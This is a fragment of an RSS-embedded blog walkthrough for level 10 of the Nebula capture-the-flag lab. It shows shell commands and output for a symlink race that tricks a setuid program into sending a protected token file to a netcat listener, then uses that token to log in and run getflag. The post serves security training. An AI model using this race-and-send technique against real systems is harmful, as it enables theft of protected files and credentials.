&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level10@nebula:~$ nc -l 18211
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;in termA we create our symlink, then run the command along with a command to update the symlink&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level10@nebula:/home/flag10$ touch /tmp/mytoken
level10@nebula:/home/flag10$ ln -fs /tmp/mytoken /tmp/getme
level10@nebula:/home/flag10$ ./flag10 /tmp/getme 192.168.0.8 &lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;amp;&lt;/span&gt; ln -fs /home/flag10/token /tmp/getme
[1] 7359
Connecting to 192.168.0.8:18211 .. level10@nebula:/home/flag10$ Connected!
Sending file .. wrote file!
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Meanwhile, back in termB&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
level10@nebula:~$ ssh flag10@localhost

flag10@localhost&amp;#39;s password: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27

flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://unlogic.co.uk/2014/07/02/cracking-nebula-part2/&#34;&gt;Part 2 of Cracking Nebula&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>